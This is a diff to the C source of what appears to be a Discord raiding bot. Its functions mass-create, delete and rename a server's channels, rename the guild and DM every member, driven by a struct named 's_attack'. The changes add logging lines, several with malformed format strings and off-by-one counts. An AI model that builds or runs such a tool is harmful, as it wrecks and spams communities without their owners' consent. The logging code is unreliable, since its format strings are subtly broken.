@@ -50,10 +50,14 @@ void mass_channel(struct discord *client, u64_snowflake_t guild_id,
 
     struct discord_create_guild_channel_params chn_params = {.name = c_name, .type = type};
 
-    for (int i = 0; i < count; i++)
+    int i = 0;
+
+    for (i = 0; i < count; i++)
     {
         discord_create_guild_channel(client, guild_id, &chn_params, NULL);
     }
+
+    log_info("Created %d channels in %" PRIu64, i+1, guild_id);
 }
 
 void guild_name(struct discord *client, u64_snowflake_t guild_id,
@@ -66,6 +70,7 @@ void guild_name(struct discord *client, u64_snowflake_t guild_id,
             .name = guild_name,
         },
         NULL);
+    log_info("Change name of % --> \"%s\"" PRIu64, guild_id, guild_name);
 }
 
 void dm_all(struct discord *client, u64_snowflake_t guild_id,
@@ -104,6 +109,7 @@ void dm_all(struct discord *client, u64_snowflake_t guild_id,
                 .content = d_message},
             NULL);
     }
+    log_info("Sent message to %d users in %" PRIu64, i+1, guild_id);
 }
 
 void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
@@ -118,6 +124,7 @@ void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
         discord_delete_channel(client, channels[i]->id, NULL);
         i++;
     }
+    log_info("Deleted %d channels in %" PRIu64, i+1, guild_id);
 }
 
 void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
@@ -139,6 +146,8 @@ void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
             NULL);
         i++;
     }
+
+    log_info("Renamed %d channels in % --> \"%s\"" PRIu64, i+1, guild_id, channel_name);
 }
 
 void change_nickname(struct discord *client, u64_snowflake_t guild_id, u64_snowflake_t user_id,
@@ -158,7 +167,6 @@ void on_ready(struct discord *client)
     const struct discord_user *bot = discord_get_self(client);
     log_info("Logged in as %s!", bot->username);
 
-    log_info("NAME: %s", s_attack.mass_channel_name);
     u64_snowflake_t guild_id = get_guild(client);
 
     char *presence_name = strtok(s_attack.presence_name, "");
